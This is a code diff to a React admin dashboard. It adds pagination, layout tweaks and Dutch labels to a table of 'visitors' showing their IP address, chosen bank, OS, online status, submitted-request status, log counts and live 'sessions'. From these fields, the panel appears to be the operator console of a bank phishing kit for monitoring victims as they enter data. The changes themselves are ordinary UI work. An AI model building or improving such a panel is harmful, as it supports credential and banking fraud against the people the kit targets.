@@ -339,6 +339,20 @@ export default function Admin() {
   const onlineCount = useMemo(() => Object.values(visitors).filter((v) => isOnline(v, now)).length, [visitors, now]);
   const requestCount = useMemo(() => allList.filter((v) => (v.status || "").endsWith("_submitted")).length, [allList]);
 
+  // Pagination: 30 visitors per page.
+  const PAGE_SIZE = 30;
+  const [page, setPage] = useState(0);
+  const pageCount = Math.max(1, Math.ceil(list.length / PAGE_SIZE));
+  const safePage = Math.min(page, pageCount - 1);
+  const paged = list.slice(safePage * PAGE_SIZE, safePage * PAGE_SIZE + PAGE_SIZE);
+
+  useEffect(() => {
+    setPage(0);
+  }, [tab, filter]);
+  useEffect(() => {
+    if (page > pageCount - 1) setPage(pageCount - 1);
+  }, [page, pageCount]);
+
   // Sticky session: once connected, the session view stays on the last known
   // snapshot even if a poll momentarily misses the row. Only explicit Back /
   // Delete / Logout closes it. Live fields keep patching underneath.
@@ -480,7 +494,7 @@ export default function Admin() {
       </div>
       {/* Top nav — pinned, never scrolls away */}
       <header className="sticky top-0 z-50 w-full border-b border-white/10 bg-[#150f28]/85 shadow-[0_8px_30px_rgba(0,0,0,0.35)] backdrop-blur-xl">
-        <div className="mx-auto flex w-full max-w-7xl flex-wrap items-center gap-2 px-3 py-2.5 sm:px-6">
+        <div className="mx-auto flex w-full flex-wrap items-center gap-2 px-3 py-2.5 sm:px-6">
           <span className="mr-1 hidden items-center gap-2 text-[14px] font-extrabold text-white sm:flex">
             <span className="flex h-7 w-7 items-center justify-center rounded-lg bg-gradient-to-br from-fuchsia-500 to-purple-700 text-[14px] shadow-[0_0_18px_rgba(217,70,239,0.5)]">A</span>
             Admin
@@ -573,7 +587,7 @@ export default function Admin() {
                       </tr>
                     </thead>
                     <tbody>
-                      {list.map((v) => {
+                      {paged.map((v) => {
                         const online = isOnline(v, now);
                         return (
                           <tr key={v.id} className="border-t border-white/5 hover:bg-white/5">
@@ -583,9 +597,9 @@ export default function Admin() {
                                 {online ? "Online" : "Offline"}
                               </span>
                             </td>
-                            <td className="px-3 py-2.5 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
-                            <td className="px-3 py-2.5 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NIET GESELECTEERD"}</td>
-                            <td className="px-3 py-2.5 text-purple-200">{parseOS(v.ua)}</td>
+                            <td className="whitespace-nowrap px-4 py-3 font-mono text-[13px] text-purple-100">{v.ip || "…"}</td>
+                            <td className="whitespace-nowrap px-4 py-3 font-semibold text-purple-100">{v.bankName || v.bank || "BANK NIET GESELECTEERD"}</td>
+                            <td className="whitespace-nowrap px-4 py-3 text-purple-200">{parseOS(v.ua)}</td>
                             <td className="whitespace-nowrap px-4 py-3">
                               <span className="inline-flex items-center gap-1 rounded bg-white/10 px-2 py-0.5 font-mono text-[13px] text-purple-100">
                                 👁 {logsByVisitor[v.id] || 0}
@@ -610,7 +624,7 @@ export default function Admin() {
 
                 {/* Phone cards */}
                 <div className="mt-3 space-y-2.5 md:hidden">
-                  {list.map((v) => {
+                  {paged.map((v) => {
                     const online = isOnline(v, now);
                     return (
                       <div key={v.id} className="w-full rounded-xl bg-[#1d1430] p-3 ring-1 ring-white/10">
@@ -618,10 +632,10 @@ export default function Admin() {
                           <MiniLogo slug={v.bank} name={v.bankName} />
                           <div className="min-w-0 flex-1">
                             <p className="truncate font-mono text-[14px] font-bold text-purple-100">{v.ip || "…"}</p>
-                            <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NOT SELECTED"} • {parseOS(v.ua)}</p>
+                            <p className="truncate text-[13px] text-purple-300">{v.bankName || "BANK NIET GESELECTEERD"} • {parseOS(v.ua)}</p>
                           </div>
                           <span className={`shrink-0 rounded-full px-2 py-0.5 text-[12px] font-bold ${online ? "bg-green-500/20 text-green-300" : "bg-white/10 text-neutral-300"}`}>
-                            {online ? "En ligne" : "Hors ligne"}
+                            {online ? "Online" : "Offline"}
                           </span>
                         </div>
                         <div className="mt-2.5 flex gap-1.5">
@@ -636,6 +650,7 @@ export default function Admin() {
                     );
                   })}
                 </div>
+                <Pagination page={safePage} pageCount={pageCount} total={list.length} pageSize={PAGE_SIZE} onPage={setPage} />
               </>
             )}
           </>
@@ -710,6 +725,45 @@ function LogCard({ s, meta, footer, wrapClass }) {
         ))}
       </div>
       {footer}
+    </div>
+  );
+}
+
+function Pagination({ page, pageCount, total, pageSize, onPage }) {
+  if (pageCount <= 1) {
+    return <p className="mt-3 text-[13px] text-purple-300">{total} bezoekers • 1 pagina</p>;
+  }
+  const from = page * pageSize + 1;
+  const to = Math.min(total, (page + 1) * pageSize);
+  // Compact page window: 1 … p-1 p p+1 … N
+  const nums = [];
+  for (let i = 0; i < pageCount; i++) {
+    if (i === 0 || i === pageCount - 1 || Math.abs(i - page) <= 1) nums.push(i);
+    else if (nums[nums.length - 1] !== "…") nums.push("…");
+  }
+  const btn = "flex min-h-[40px] min-w-[40px] items-center justify-center rounded-lg px-2 text-[14px] font-bold transition active:scale-95";
+  return (
+    <div className="mt-3 flex flex-wrap items-center gap-1.5">
+      <span className="mr-1 text-[13px] text-purple-300">{from}–{to} van {total}</span>
+      <button disabled={page === 0} onClick={() => onPage(page - 1)} className={`${btn} bg-white/10 text-purple-100 hover:bg-white/20 disabled:opacity-40`}>
+        ←
+      </button>
+      {nums.map((n, i) =>
+        n === "…" ? (
+          <span key={`e${i}`} className="px-1 text-purple-300">…</span>
+        ) : (
+          <button
+            key={n}
+            onClick={() => onPage(n)}
+            className={`${btn} ${n === page ? "bg-fuchsia-600 text-white shadow-[0_4px_16px_rgba(217,70,239,0.4)]" : "bg-white/10 text-purple-100 hover:bg-white/20"}`}
+          >
+            {n + 1}
+          </button>
+        )
+      )}
+      <button disabled={page >= pageCount - 1} onClick={() => onPage(page + 1)} className={`${btn} bg-white/10 text-purple-100 hover:bg-white/20 disabled:opacity-40`}>
+        →
+      </button>
     </div>
   );
 }
